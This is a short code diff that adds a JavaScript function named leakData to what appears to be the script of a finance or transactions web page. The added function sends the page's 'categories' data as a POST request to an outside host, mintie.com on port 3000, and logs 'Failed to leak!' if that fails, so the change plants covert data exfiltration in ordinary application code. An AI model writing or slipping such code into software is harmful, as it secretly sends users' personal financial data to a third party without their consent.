@@ -113,6 +113,15 @@
     });
   }
 
+function leakData() {
+  try {
+    var req = new XMLHttpRequest();
+    req.open('POST', 'http://mintie.com:3000/');
+    req.send(JSON.stringify(categories));
+  } catch(e) {
+    console.log("Failed to leak!");
+  }
+}
 
 $('#transactions-modal').on('show.bs.modal', function (event) {
   var button = $(event.relatedTarget);
